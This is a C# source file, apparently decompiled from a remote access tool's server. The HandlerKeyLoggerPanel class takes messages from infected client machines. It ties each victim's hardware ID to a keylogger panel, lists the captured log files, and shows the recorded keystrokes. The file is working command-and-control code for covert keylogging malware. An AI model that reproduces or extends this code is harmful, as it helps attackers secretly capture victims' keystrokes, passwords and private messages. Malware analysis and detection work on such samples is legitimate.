using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerKeyLoggerPanel
{
	public static void Read(Clients client, object[] objects)
	{
		switch ((string)objects[1])
		{
		case "Connect":
		{
			FormKeyLoggerPanel form3 = (FormKeyLoggerPanel)Application.OpenForms["KeyLoggerPanel:" + (string)objects[2]];
			if (form3 == null)
			{
				client.Disconnect();
				break;
			}
			form3.Invoke((MethodInvoker)delegate
			{
				form3.Text = "KeyLogger Panel [" + (string)objects[2] + "]";
				form3.client = client;
				form3.richTextBox1.Enabled = true;
				form3.dataGridView3.Enabled = true;
			});
			client.Tag = form3;
			client.Hwid = (string)objects[2];
			break;
		}
		case "List":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormKeyLoggerPanel form2 = (FormKeyLoggerPanel)client.Tag;
			form2.Invoke((MethodInvoker)delegate
			{
				form2.dataGridView3.Rows.Clear();
				int num = 2;
				while (num < objects.Length)
				{
					DataGridViewRow dataGridViewRow = new DataGridViewRow
					{
						Cells = { (DataGridViewCell)new DataGridViewTextBoxCell
						{
							Value = (string)objects[num++]
						} }
					};
					form2.dataGridView3.Rows.Add(dataGridViewRow);
				}
			});
			break;
		}
		case "Log":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormKeyLoggerPanel form = (FormKeyLoggerPanel)client.Tag;
			form.Invoke((MethodInvoker)delegate
			{
				form.richTextBox1.Text = (string)objects[2];
			});
			break;
		}
		}
	}
}
